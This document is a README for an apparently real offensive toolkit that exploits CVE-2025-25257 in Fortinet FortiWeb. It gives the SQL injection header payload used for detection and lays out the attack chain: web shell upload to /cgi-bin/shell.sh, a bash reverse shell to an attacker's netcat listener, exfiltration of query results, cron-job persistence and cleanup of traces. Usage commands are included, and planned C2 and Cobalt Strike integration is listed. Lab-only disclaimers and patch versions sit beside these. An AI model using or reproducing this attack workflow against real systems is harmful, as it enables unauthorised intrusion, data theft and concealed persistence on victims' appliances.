# FortiWeb RCE Toolkit 🔐

Automated proof-of-concept tool for **CVE-2025-25257** in Fortinet FortiWeb – featuring **reverse shell**, **exfiltration**, **persistence**, and **cleanup**. **Only for lab/testing environments. DO NOT USE in production.**

---

## ⚙️ Features

- ✔️ Pre-authenticated detection of vulnerable FortiWeb versions  
- 🐚 Reverse shell (bash) via `/cgi-bin/shell.sh`  
- 📤 Encrypted data exfiltration to `/tmp/exfil.txt` (Base64-encoded)  
- 🕒 Persistence via cron job (`/etc/cron.d/sys`)  
- 🧹 Full cleanup after use (removes shell + cron + SQL traces)  
- 🔒 Only active while listener runs and cleanup is triggered  

---

## 📋 Requirements

- Python 3.6+  
- `requests` library:  
  ```bash
  pip install requests
***

## 🚀 Usage

```bash
git clone https://github.com/youruser/fortiweb_rce_toolkit.git
cd fortiweb_rce_toolkit

# Run attacker listener
nc -lnvp 4444

# Run exploit with options
python3 exploit.py <target> --https --lhost <attacker_ip> --lport 4444 \
   --exfil "user(),version()" --persist

# After shell session ends
# Press ENTER to trigger cleanup
```

* Use `--https` if target uses HTTPS

* `--lhost` and `--lport` must match your listener

* `--exfil` (optional): SQL expression to exfiltrate

* `--persist`: (optional) enables cron persistence

***

## 🔒 Technical Workflow

1. **Detect** vulnerability by sending `Authorization: Bearer AAAAAA'or'1'='1`

2. **Upload** `/cgi-bin/shell.sh` via SQL injection

3. **Optional exfil**: writes base64 result of SQL query to `/tmp/exfil.txt`

4. **Optional persistence**: cron job executes shell every 5 minutes

5. **User invokes shell and performs tasks**

6. **Cleanup** wipes shell, cron job, and SQL artifacts

***

## ⚠️ Warnings & Ethics

* ⚠️ **Only use in isolated lab environments.**

* ⚠️ **Using this tool on production systems is illegal and unethical.**

* 📌 Always patch FortiWeb to a fixed version: `7.0.11+`, `7.2.11+`, `7.4.8+`, or `7.6.4+`.

  * See advisories: FortiGuard, TheHackerNews, BleepingComputer, InfosecBulletin

* 🔍 Recommended defensive action: block HTTP management interfaces until patched

***

## 🛠️ Future Enhancements

* TLS over reverse shell

* Encrypted exfil file transfer (SCP/s3)

* Automated Steam-level C2 communication

* Integration with Red Team frameworks (e.g. Cobalt Strike, Covenant)

***

## 🧠 References

* CVE‑2025‑25257 advisory & PoC: Fortinet, Rapid7, BleepingComputer

* Technical analysis: Undercode Testing, InfoSecBulletin

* FortiWeb patch versions: FortiGuard FG‑IR‑25‑151
